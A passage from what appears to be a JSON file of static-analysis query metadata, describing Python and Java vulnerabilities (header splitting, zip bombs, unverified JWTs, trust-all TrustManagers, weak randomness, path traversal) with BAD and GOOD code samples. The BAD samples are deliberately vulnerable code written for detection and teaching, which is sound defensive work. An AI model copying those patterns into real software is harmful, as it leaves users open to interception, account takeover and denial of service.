    "description": "Writing user input directly to an HTTP header makes code vulnerable to attack by header splitting.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "py/http-response-splitting",
    "tags": [
      "security",
      "external/cwe/cwe-113",
      "external/cwe/cwe-079"
    ],
    "filename": "ccd76212-HeaderInjection",
    "language": "python",
    "help": "# HTTP Response Splitting\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP header can lead to an HTTP response-splitting vulnerability.\n\nIf user-controlled input is used in an HTTP header that allows line break characters, an attacker can inject additional headers or control the response body, leading to vulnerabilities such as XSS or cache poisoning.\n\n\n## Recommendation\nEnsure that user input containing line break characters is not written to an HTTP header.\n\n\n## Example\nIn the following example, the case marked BAD writes user input to the header name. In the GOOD case, input is first escaped to not contain any line break characters.\n\n\n```python\n@app.route(\"/example_bad\")\ndef example_bad():\n    rfs_header = request.args[\"rfs_header\"]\n    response = Response()\n    custom_header = \"X-MyHeader-\" + rfs_header\n    # BAD: User input is used as part of the header name.\n    response.headers[custom_header] = \"HeaderValue\" \n    return response\n\n@app.route(\"/example_good\")\ndef example_bad():\n    rfs_header = request.args[\"rfs_header\"]\n    response = Response()\n    custom_header = \"X-MyHeader-\" + rfs_header.replace(\"\\n\", \"\").replace(\"\\r\",\"\").replace(\":\",\"\")\n    # GOOD: Line break characters are removed from the input.\n    response.headers[custom_header] = \"HeaderValue\" \n    return response\n```\n\n## References\n* SecLists.org: [HTTP response splitting](https://seclists.org/bugtraq/2005/Apr/187).\n* OWASP: [HTTP Response Splitting](https://www.owasp.org/index.php/HTTP_Response_Splitting).\n* Wikipedia: [HTTP response splitting](http://en.wikipedia.org/wiki/HTTP_response_splitting).\n* CAPEC: [CAPEC-105: HTTP Request Splitting](https://capec.mitre.org/data/definitions/105.html)\n* Common Weakness Enumeration: [CWE-113](https://cwe.mitre.org/data/definitions/113.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "py/decompression-bomb": {
    "name": "Decompression Bomb",
    "description": "Uncontrolled data that flows into decompression library APIs without checking the compression rate is dangerous",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "py/decompression-bomb",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-409"
    ],
    "filename": "e3336510-DecompressionBombs",
    "language": "python",
    "help": "# Decompression Bomb\nExtracting Compressed files with any compression algorithm like gzip can cause to denial of service attacks.\n\nAttackers can compress a huge file which created by repeated similiar byte and convert it to a small compressed file.\n\n\n## Recommendation\nWhen you want to decompress a user-provided compressed file you must be careful about the decompression ratio or read these files within a loop byte by byte to be able to manage the decompressed size in each cycle of the loop.\n\n\n## Example\npython ZipFile library is vulnerable by default\n\n\n```python\nimport zipfile\n\n\ndef Bad(zip_path):\n    zipfile.ZipFile(zip_path, \"r\").extractall()\n\n```\nBy checking the decompressed size from input zipped file you can check the decompression ratio. attackers can forge this decompressed size header too. So can't rely on file_size attribute of ZipInfo class. this is recommended to use \"ZipFile.open\" method to be able to manage decompressed size.\n\nReading decompressed file byte by byte and verifying the total current size in each loop cycle in recommended to use in any decompression library.\n\n\n```python\nimport zipfile\n\n\ndef safeUnzip(zipFileName):\n    '''\n    safeUnzip reads each file inside the zipfile 1 MB by 1 MB\n    and during extraction or reading of these files it checks the total decompressed size\n    doesn't exceed the SIZE_THRESHOLD\n    '''\n    buffer_size = 1024 * 1024 * 1  # 1 MB\n    total_size = 0\n    SIZE_THRESHOLD = 1024 * 1024 * 10  # 10 MB\n    with zipfile.ZipFile(zipFileName) as myzip:\n        for fileinfo in myzip.infolist():\n            with myzip.open(fileinfo.filename, mode=\"r\") as myfile:\n                content = b''\n                chunk = myfile.read(buffer_size)\n                total_size += buffer_size\n                if total_size > SIZE_THRESHOLD:\n                    print(\"Bomb detected\")\n                    return False  # it isn't a successful extract or read\n                content += chunk\n                # reading next bytes of uncompressed data\n                while chunk:\n                    chunk = myfile.read(buffer_size)\n                    total_size += buffer_size\n                    if total_size > SIZE_THRESHOLD:\n                        print(\"Bomb detected\")\n                        return False  # it isn't a successful extract or read\n                    content += chunk\n\n                # An example of extracting or reading each decompressed file here\n                print(bytes.decode(content, 'utf-8'))\n    return True  # it is a successful extract or read\n\n```\n\n## References\n* [CVE-2023-22898](https://nvd.nist.gov/vuln/detail/CVE-2023-22898)\n* [A great research to gain more impact by this kind of attack](https://www.bamsoftware.com/hacks/zipbomb/)\n* Common Weakness Enumeration: [CWE-409](https://cwe.mitre.org/data/definitions/409.html).\n"
  },
  "py/jwt-missing-verification": {
    "name": "JWT missing secret or public key verification",
    "description": "The application does not verify the JWT payload with a cryptographic secret or public key.",
    "kind": "problem",
    "problem.severity": "warning",
    "id": "py/jwt-missing-verification",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-347"
    ],
    "filename": "0c0ad72e-JWTMissingSecretOrPublicKeyVerification",
    "language": "python",
    "help": "# JWT missing secret or public key verification\nApplications decoding a JSON Web Token (JWT) may be vulnerable when the key isn't verified in the process.\n\n\n## Recommendation\nSet the `verify` argument to `True` or use a framework that does it by default.\n\n\n## Example\nThis example shows a PyJWT encoding call with the `verify` argument set to `False`.\n\n\n```python\nimport jwt\n\n# unverified decoding\njwt.decode(payload, key=\"somekey\", verify=False)\n\n```\n\n## References\n* PyJWT: [Documentation](https://pyjwt.readthedocs.io/en/stable/).\n* Authlib JWT: [Documentation](https://docs.authlib.org/en/latest/specs/rfc7519.html).\n* Python-Jose: [Documentation](https://github.com/mpdavis/python-jose).\n* Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  },
  "py/reflective-xss-email": {
    "name": "Reflected server-side cross-site scripting",
    "description": "Writing user input directly to a web page allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 2.9,
    "sub-severity": "high",
    "id": "py/reflective-xss-email",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "e9029026-EmailXss",
    "language": "python"
  },
  "java/exec-tainted-environment": {
    "name": "Building a command with an injected environment variable",
    "description": "Passing environment variables containing externally controlled strings to a command line is vulnerable to malicious changes to the environment of a subprocess.",
    "problem.severity": "error",
    "kind": "path-problem",
    "security-severity": 9.8,
    "precision": "medium",
    "id": "java/exec-tainted-environment",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088",
      "external/cwe/cwe-454"
    ],
    "filename": "f03693da-ExecTaintedEnvironment",
    "language": "java",
    "help": "# Building a command with an injected environment variable\nPassing unvalidated user input into the environment variables of a subprocess can allow an attacker to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the environment variable or its value. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable environment variables cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nIn the following (BAD) example, the environment variable `PATH` is set to the value of the user input `path` without validation.\n\n\n```java\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n    String path = request.getParameter(\"path\");\n\n    Map<String, String> env = processBuilder.environment();\n    // BAD: path is tainted and being added to the environment\n    env.put(\"PATH\", path);\n\n    processBuilder.start();\n}\n```\nIn the following (BAD) example, an environment variable is set with a name that is derived from the user input `var` without validation.\n\n\n```java\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n    String attr = request.getParameter(\"attribute\");\n    String value = request.getParameter(\"value\");\n\n    Map<String, String> env = processBuilder.environment();\n    // BAD: attr and value are tainted and being added to the environment\n    env.put(attr, value);\n\n    processBuilder.start();\n}\n```\nIn the following (GOOD) example, the user's input is validated before being used to set the environment variable.\n\n\n```java\nString opt = request.getParameter(\"opt\");\nString value = request.getParameter(\"value\");\n\nMap<String, String> env = processBuilder.environment();\n\n// GOOD: opt and value are checked before being added to the environment\nif (permittedJavaOptions.contains(opt) && validOption(opt, value)) {\n    env.put(opt, value);\n}\n```\nIn the following (GOOD) example, the user's input is checked and used to determine an environment variable to add.\n\n\n```java\nMap<String, String> env = builder.environment();\nString debug = request.getParameter(\"debug\");\n\n// GOOD: Checking the value and not tainting the variable added to the environment\nif (debug != null) {\n    env.put(\"PYTHONDEBUG\", \"1\");\n}\n\n```\n\n## References\n* The Java Tutorials: [Environment Variables](https://docs.oracle.com/javase/tutorial/essential/environment/env.html).\n* OWASP: [Command injection](https://owasp.org/www-community/attacks/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n* Common Weakness Enumeration: [CWE-454](https://cwe.mitre.org/data/definitions/454.html).\n"
  },
  "java/improper-intent-verification": {
    "name": "Improper verification of intent by broadcast receiver",
    "description": "A broadcast receiver that does not verify intents it receives may be susceptible to unintended behavior by third party applications sending it explicit intents.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.2,
    "precision": "high",
    "id": "java/improper-intent-verification",
    "tags": [
      "security",
      "external/cwe/cwe-925"
    ],
    "filename": "dee02cdc-ImproperIntentVerification",
    "language": "java",
    "help": "# Improper verification of intent by broadcast receiver\nWhen an Android application uses a `BroadcastReceiver` to receive intents, it is also able to receive explicit intents that are sent directly to it, regardless of its filter. Certain intent actions are only able to be sent by the operating system, not third-party applications. However, a `BroadcastReceiver` that is registered to receive system intents is still able to receive intents from a third-party application, so it should check that the intent received has the expected action. Otherwise, a third-party application could impersonate the system this way to cause unintended behavior, such as a denial of service.\n\n\n## Example\nIn the following code, the `ShutdownReceiver` initiates a shutdown procedure upon receiving an intent, without checking that the received action is indeed `ACTION_SHUTDOWN`. This allows third-party applications to send explicit intents to this receiver to cause a denial of service.\n\n\n```java\npublic class ShutdownReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(final Context context, final Intent intent) {\n        mainActivity.saveLocalData();\n        mainActivity.stopActivity();\n    }\n}\n```\n\n```xml\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"test\">\n    <application>\n        <receiver android:name=\".BootReceiverXml\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n            </intent-filter>\n        </receiver>\n    </application>\n</manifest>\n```\n\n## Recommendation\nIn the `onReceive` method of a `BroadcastReceiver`, the action of the received Intent should be checked. The following code demonstrates this.\n\n\n```java\npublic class ShutdownReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(final Context context, final Intent intent) {\n        if (!intent.getAction().equals(Intent.ACTION_SHUTDOWN)) {\n            return;\n        }\n        mainActivity.saveLocalData();\n        mainActivity.stopActivity();\n    }\n}\n```\n\n## References\n* Common Weakness Enumeration: [CWE-925](https://cwe.mitre.org/data/definitions/925.html).\n"
  },
  "java/android/arbitrary-apk-installation": {
    "id": "java/android/arbitrary-apk-installation",
    "name": "Android APK installation",
    "description": "Creating an intent with a URI pointing to a untrusted file can lead to the installation of an untrusted application.",
    "kind": "path-problem",
    "security-severity": 9.3,
    "problem.severity": "error",
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-ArbitraryApkInstallation",
    "language": "java",
    "help": "# Android APK installation\nAndroid allows an application to install an Android Package Kit (APK) using an `Intent` with the `\"application/vnd.android.package-archive\"` MIME type. If the file used in the `Intent` is from a location that is not controlled by the application (for example, an SD card that is universally writable), this can result in the unintended installation of untrusted applications.\n\n\n## Recommendation\nYou should install packages using the `PackageInstaller` class.\n\nIf you need to install from a file, you should use a `FileProvider`. Content providers can provide more specific permissions than file system permissions can.\n\nWhen your application does not require package installations, do not add the `REQUEST_INSTALL_PACKAGES` permission in the manifest file.\n\n\n## Example\nIn the following (bad) example, the package is installed from a file which may be altered by another application:\n\n\n```java\nimport android.app.Activity;\nimport android.content.Intent;\nimport android.net.Uri;\nimport android.os.Environment;\n\nimport java.io.File;\n\n/* Get a file from external storage */\nFile file = new File(Environment.getExternalStorageDirectory(), \"myapp.apk\");\nIntent intent = new Intent(Intent.ACTION_VIEW);\n/* Set the mimetype to APK */\nintent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\n\nstartActivity(intent);\n\n```\nIn the following (good) example, the package is installed by using a `FileProvider`:\n\n\n```java\nimport android.app.Activity;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.net.Uri;\nimport androidx.core.content.FileProvider;\n\nimport java.io.File;\nimport java.io.FileOutputStream;\n\nString tempFilename = \"temporary.apk\";\nbyte[] buffer = new byte[16384];\n\n/* Copy application asset into temporary file */\ntry (InputStream is = getAssets().open(assetName);\n     FileOutputStream fout = openFileOutput(tempFilename, Context.MODE_PRIVATE)) {\n    int n;\n    while ((n=is.read(buffer)) >= 0) {\n        fout.write(buffer, 0, n);\n    }\n}\n\n/* Expose temporary file with FileProvider */\nFile toInstall = new File(this.getFilesDir(), tempFilename);\nUri applicationUri = FileProvider.getUriForFile(this, \"com.example.apkprovider\", toInstall);\n\n/* Create Intent and set data to APK file. */\nIntent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);\nintent.setData(applicationUri);\nintent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n\nstartActivity(intent);\n\n```\nIn the following (good) example, the package is installed using an instance of the `android.content.pm.PackageInstaller` class:\n\n\n```java\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.pm.PackageInstaller;\n\nprivate static final String PACKAGE_INSTALLED_ACTION =\n    \"com.example.SESSION_API_PACKAGE_INSTALLED\";\n\n/* Create the package installer and session */\nPackageInstaller packageInstaller = getPackageManager().getPackageInstaller();\nPackageInstaller.SessionParams params =\n    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);\nint sessionId = packageInstaller.createSession(params);\nsession = packageInstaller.openSession(sessionId);\n\n/* Load asset into session */\ntry (OutputStream packageInSession = session.openWrite(\"package\", 0, -1);\n     InputStream is = getAssets().open(assetName)) {\n    byte[] buffer = new byte[16384];\n    int n;\n    while ((n = is.read(buffer)) >= 0) {\n        packageInSession.write(buffer, 0, n);\n    }\n}\n\n/* Create status receiver */\nIntent intent = new Intent(this, InstallApkSessionApi.class);\nintent.setAction(PACKAGE_INSTALLED_ACTION);\nPendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);\nIntentSender statusReceiver = pendingIntent.getIntentSender();\n\n/* Commit the session */\nsession.commit(statusReceiver);\n\n```\n\n## References\n* Android Developers: [Intent.ACTION_INSTALL_PACKAGE](https://developer.android.com/reference/android/content/Intent#ACTION_INSTALL_PACKAGE).\n* Android Developers: [Manifest.permission.REQUEST_INSTALL_PACKAGES](https://developer.android.com/reference/android/Manifest.permission#REQUEST_INSTALL_PACKAGES).\n* Android Developers: [PackageInstaller](https://developer.android.com/reference/android/content/pm/PackageInstaller).\n* Android Developers: [FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/insecure-randomness": {
    "name": "Insecure randomness",
    "description": "Using a cryptographically Insecure pseudo-random number generator to generate a security-sensitive value may allow an attacker to predict what value will be generated.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/insecure-randomness",
    "tags": [
      "security",
      "external/cwe/cwe-330",
      "external/cwe/cwe-338"
    ],
    "filename": "afbeff24-InsecureRandomness",
    "language": "java",
    "help": "# Insecure randomness\nIf you use a cryptographically weak pseudo-random number generator to generate security-sensitive values, such as passwords, attackers can more easily predict those values.\n\nPseudo-random number generators generate a sequence of numbers that only approximates the properties of random numbers. The sequence is not truly random because it is completely determined by a relatively small set of initial values (the seed). If the random number generator is cryptographically weak, then this sequence may be easily predictable through outside observations.\n\n\n## Recommendation\nThe `java.util.Random` random number generator is not cryptographically secure. Use a secure random number generator such as `java.security.SecureRandom` instead.\n\nUse a cryptographically secure pseudo-random number generator if the output is to be used in a security-sensitive context. As a general rule, a value should be considered \"security-sensitive\" if predicting it would allow the attacker to perform an action that they would otherwise be unable to perform. For example, if an attacker could predict the random password generated for a new user, they would be able to log in as that new user.\n\n\n## Example\nThe following examples show different ways of generating a cookie with a random value.\n\nIn the first (BAD) case, we generate a fresh cookie by appending a random integer to the end of a static string. The random number generator used (`Random`) is not cryptographically secure, so it may be possible for an attacker to predict the generated cookie.\n\n\n```java\nRandom r = new Random();\n\nbyte[] bytes = new byte[16];\nr.nextBytes(bytes);\n\nString cookieValue = encode(bytes);\n\nCookie cookie = new Cookie(\"name\", cookieValue);\nresponse.addCookie(cookie);\n\n```\nIn the second (GOOD) case, we generate a fresh cookie by appending a random integer to the end of a static string. The random number generator used (`SecureRandom`) is cryptographically secure, so it is not possible for an attacker to predict the generated cookie.\n\n\n```java\nSecureRandom r = new SecureRandom();\n\nbyte[] bytes = new byte[16];\nr.nextBytes(bytes);\n\nString cookieValue = encode(bytes);\n\nCookie cookie = new Cookie(\"name\", cookieValue);\nresponse.addCookie(cookie);\n\n```\n\n## References\n* Wikipedia: [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n* Java Docs: [Random](http://docs.oracle.com/javase/8/docs/api/java/util/Random.html).\n* Java Docs: [SecureRandom](http://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html).\n* Common Weakness Enumeration: [CWE-330](https://cwe.mitre.org/data/definitions/330.html).\n* Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
  },
  "java/partial-path-traversal": {
    "name": "Partial path traversal vulnerability",
    "description": "A prefix used to check that a canonicalised path falls within another must be slash-terminated.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "java/partial-path-traversal",
    "tags": [
      "security",
      "external/cwe/cwe-023"
    ],
    "filename": "42984bd8-PartialPathTraversal",
    "language": "java",
    "help": "# Partial path traversal vulnerability\nA common way to check that a user-supplied path `SUBDIR` falls inside a directory `DIR` is to use `getCanonicalPath()` to remove any path-traversal elements and then check that `DIR` is a prefix. However, if `DIR` is not slash-terminated, this can unexpectedly allow access to siblings of `DIR`.\n\nSee also `java/partial-path-traversal-from-remote`, which is similar to this query but only flags instances with evidence of remote exploitability.\n\n\n## Recommendation\nIf the user should only access items within a certain directory `DIR`, ensure that `DIR` is slash-terminated before checking that `DIR` is a prefix of the user-provided path, `SUBDIR`. Note, Java's `getCanonicalPath()` returns a **non**-slash-terminated path string, so a slash must be added to `DIR` if that method is used.\n\n\n## Example\nIn this example, the `if` statement checks if `parent.getCanonicalPath()` is a prefix of `dir.getCanonicalPath()`. However, `parent.getCanonicalPath()` is not slash-terminated. This means that users that supply `dir` may be also allowed to access siblings of `parent` and not just children of `parent`, which is a security issue.\n\n\n```java\npublic class PartialPathTraversalBad {\n    public void example(File dir, File parent) throws IOException {\n        if (!dir.getCanonicalPath().startsWith(parent.getCanonicalPath())) {\n            throw new IOException(\"Path traversal attempt: \" + dir.getCanonicalPath());\n        }\n    }\n}\n\n```\nIn this example, the `if` statement checks if `parent.toPath()` is a prefix of `dir.normalize()`. Because `Path#startsWith` does the correct check that `dir` is a child of `parent`, users will not be able to access siblings of `parent`, as desired.\n\n\n```java\nimport java.io.File;\n\npublic class PartialPathTraversalGood {\n    public void example(File dir, File parent) throws IOException {\n        if (!dir.toPath().normalize().startsWith(parent.toPath())) {\n            throw new IOException(\"Path traversal attempt: \" + dir.getCanonicalPath());\n        }\n    }\n}\n\n```\n\n## References\n* OWASP: [Partial Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* CVE-2022-23457: [ ESAPI Vulnerability Report](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/GHSL-2022-008_The_OWASP_Enterprise_Security_API.md).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n"
  },
  "java/jhipster-prng": {
    "name": "Detect JHipster Generator Vulnerability CVE-2019-16303",
    "description": "Using a vulnerable version of JHipster to generate random numbers makes it easier for attackers to take over accounts.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "very-high",
    "id": "java/jhipster-prng",
    "tags": [
      "security",
      "external/cwe/cwe-338"
    ],
    "filename": "f4c5a59b-JHipsterGeneratedPRNG",
    "language": "java",
    "help": "# Detect JHipster Generator Vulnerability CVE-2019-16303\nThis query detects instances of `RandomUtil.java` that were generated by a [JHipster](https://www.jhipster.tech/) version that is vulnerable to [CVE-2019-16303](https://github.com/jhipster/jhipster-kotlin/security/advisories/GHSA-j3rh-8vwq-wh84).\n\nIf an app uses `RandomUtil.java` generated by a vulnerable version of JHipster, attackers can request a password reset token and use this to predict the value of future reset tokens generated by this server. Using this information, they can create a reset link that allows them to take over any account.\n\nThis vulnerability has a [ CVSS v3.0 Base Score of 9.8/10 ](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2019-16303&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST).\n\n\n## Example\nThe example below shows the vulnerable `RandomUtil` class generated by [JHipster prior to version 6.3.0](https://www.jhipster.tech/2019/09/13/jhipster-release-6.3.0.html).\n\n\n```java\nimport org.apache.commons.lang3.RandomStringUtils;\n\n/**\n * Utility class for generating random Strings.\n */\npublic final class RandomUtil {\n\n    private static final int DEF_COUNT = 20;\n\n    private RandomUtil() {\n    }\n\n    /**\n     * Generate a password.\n     *\n     * @return the generated password.\n     */\n    public static String generatePassword() {\n        return RandomStringUtils.randomAlphanumeric(DEF_COUNT); // BAD: RandomStringUtils does not use SecureRandom\n    }\n\n    /**\n     * Generate an activation key.\n     *\n     * @return the generated activation key.\n     */\n    public static String generateActivationKey() {\n        return RandomStringUtils.randomNumeric(DEF_COUNT); // BAD: RandomStringUtils does not use SecureRandom\n    }\n\n    /**\n     * Generate a reset key.\n     *\n     * @return the generated reset key.\n     */\n    public static String generateResetKey() {\n        return RandomStringUtils.randomNumeric(DEF_COUNT); // BAD: RandomStringUtils does not use SecureRandom\n    }\n\n    /**\n     * Generate a unique series to validate a persistent token, used in the\n     * authentication remember-me mechanism.\n     *\n     * @return the generated series data.\n     */\n    public static String generateSeriesData() {\n        return RandomStringUtils.randomAlphanumeric(DEF_COUNT); // BAD: RandomStringUtils does not use SecureRandom\n    }\n\n    /**\n     * Generate a persistent token, used in the authentication remember-me mechanism.\n     *\n     * @return the generated token data.\n     */\n    public static String generateTokenData() {\n        return RandomStringUtils.randomAlphanumeric(DEF_COUNT); // BAD: RandomStringUtils does not use SecureRandom\n    }\n}\n\n```\nBelow is a fixed version of the `RandomUtil` class.\n\n\n```java\nimport org.apache.commons.lang3.RandomStringUtils;\n\nimport java.security.SecureRandom;\n\n/**\n * Utility class for generating random Strings.\n */\npublic final class RandomUtil {\n    private static final SecureRandom SECURE_RANDOM = new SecureRandom(); // GOOD: Using SecureRandom\n\n    private static final int DEF_COUNT = 20;\n\n    static {\n        SECURE_RANDOM.nextBytes(new byte[64]);\n    }\n\n    private RandomUtil() {\n    }\n\n    private static String generateRandomAlphanumericString() {\n        // GOOD: Passing Secure Random to RandomStringUtils::random\n        return RandomStringUtils.random(DEF_COUNT, 0, 0, true, true, null, SECURE_RANDOM);\n    }\n\n    /**\n     * Generate a password.\n     *\n     * @return the generated password.\n     */\n    public static String generatePassword() {\n        return generateRandomAlphanumericString();\n    }\n\n    /**\n     * Generate an activation key.\n     *\n     * @return the generated activation key.\n     */\n    public static String generateActivationKey() {\n        return generateRandomAlphanumericString();\n    }\n\n    /**\n     * Generate a reset key.\n     *\n     * @return the generated reset key.\n     */\n    public static String generateResetKey() {\n        return generateRandomAlphanumericString();\n    }\n\n    /**\n     * Generate a unique series to validate a persistent token, used in the\n     * authentication remember-me mechanism.\n     *\n     * @return the generated series data.\n     */\n    public static String generateSeriesData() {\n        return generateRandomAlphanumericString();\n    }\n\n    /**\n     * Generate a persistent token, used in the authentication remember-me mechanism.\n     *\n     * @return the generated token data.\n     */\n    public static String generateTokenData() {\n        return generateRandomAlphanumericString();\n    }\n}\n\n```\n\n## Recommendation\nYou should refactor the `RandomUtil` class and replace every call to `RandomStringUtils.randomAlphaNumeric`. You could regenerate the class using the latest version of JHipster, or use an automated refactoring. For example, using the [Patching JHipster CWE-338](https://github.com/moderneinc/jhipster-cwe-338) for the [Rewrite project](https://github.com/openrewrite/rewrite).\n\n\n## References\n* Cloudflare Blog: [ Why secure systems require random numbers ](https://blog.cloudflare.com/why-randomness-matters/)\n* Hacker News: [ How I Hacked Hacker News (with arc security advisory) ](https://news.ycombinator.com/item?id=639976)\n* Posts by Pucara Information Security Team: [ The Java Soothsayer: A practical application for insecure randomness. (Includes free 0day) ](https://blog.pucarasec.com/2020/05/09/the-java-soothsayer-a-practical-application-for-insecure-randomness-includes-free-0day/)\n* Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
  },
  "java/insecure-trustmanager": {
    "name": "`TrustManager` that accepts all certificates",
    "description": "Trusting all certificates allows an attacker to perform a machine-in-the-middle attack.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/insecure-trustmanager",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "865b12b5-InsecureTrustManager",
    "language": "java",
    "help": "# `TrustManager` that accepts all certificates\nIf the `checkServerTrusted` method of a `TrustManager` never throws a `CertificateException`, it trusts every certificate. This allows an attacker to perform a machine-in-the-middle attack against the application, therefore breaking any security Transport Layer Security (TLS) gives.\n\nAn attack might look like this:\n\n1. The vulnerable program connects to `https://example.com`.\n1. The attacker intercepts this connection and presents a valid, self-signed certificate for `https://example.com`.\n1. The vulnerable program calls the `checkServerTrusted` method to check whether it should trust the certificate.\n1. The `checkServerTrusted` method of your `TrustManager` does not throw a `CertificateException`.\n1. The vulnerable program accepts the certificate and proceeds with the connection since your `TrustManager` implicitly trusted it by not throwing an exception.\n1. The attacker can now read the data your program sends to `https://example.com` and/or alter its replies while the program thinks the connection is secure.\n\n## Recommendation\nDo not use a custom `TrustManager` that trusts any certificate. If you have to use a self-signed certificate, don't trust every certificate, but instead only trust this specific certificate. See below for an example of how to do this.\n\n\n## Example\nIn the first (bad) example, the `TrustManager` never throws a `CertificateException` and therefore implicitly trusts any certificate. This allows an attacker to perform a machine-in-the-middle attack. In the second (good) example, the self-signed certificate that should be trusted is loaded into a `KeyStore`. This explicitly defines the certificate as trusted and there is no need to create a custom `TrustManager`.\n\n\n```java\npublic static void main(String[] args) throws Exception {\n    {\n        class InsecureTrustManager implements X509TrustManager {\n            @Override\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n                // BAD: Does not verify the certificate chain, allowing any certificate.\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n\n            }\n        }\n        SSLContext context = SSLContext.getInstance(\"TLS\");\n        TrustManager[] trustManager = new TrustManager[] { new InsecureTrustManager() };\n        context.init(null, trustManager, null);\n    }\n    {\n        SSLContext context = SSLContext.getInstance(\"TLS\");\n        File certificateFile = new File(\"path/to/self-signed-certificate\");\n        // Create a `KeyStore` with default type\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        // `keyStore` is initially empty\n        keyStore.load(null, null);\n        X509Certificate generatedCertificate;\n        try (InputStream cert = new FileInputStream(certificateFile)) {\n            generatedCertificate = (X509Certificate) CertificateFactory.getInstance(\"X509\")\n                    .generateCertificate(cert);\n        }\n        // Add the self-signed certificate to the key store\n        keyStore.setCertificateEntry(certificateFile.getName(), generatedCertificate);\n        // Get default `TrustManagerFactory`\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        // Use it with our key store that trusts our self-signed certificate\n        tmf.init(keyStore);\n        TrustManager[] trustManagers = tmf.getTrustManagers();\n        context.init(null, trustManagers, null);\n        // GOOD, we are not using a custom `TrustManager` but instead have\n        // added the self-signed certificate we want to trust to the key\n        // store. Note, the `trustManagers` will **only** trust this one\n        // certificate.\n        \n        URL url = new URL(\"https://self-signed.badssl.com/\");\n        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n        conn.setSSLSocketFactory(context.getSocketFactory());\n    }\n}\n\n```\n\n## References\n* Android Developers: [Security with HTTPS and SSL](https://developer.android.com/training/articles/security-ssl).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "java/jxbrowser/disabled-certificate-validation": {
    "name": "JxBrowser with disabled certificate validation",
    "description": "Insecure configuration of JxBrowser disables certificate validation making the app vulnerable to man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/jxbrowser/disabled-certificate-validation",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-295"
    ],
    "filename": "a3804d6e-JxBrowserWithoutCertValidation",
    "language": "java",
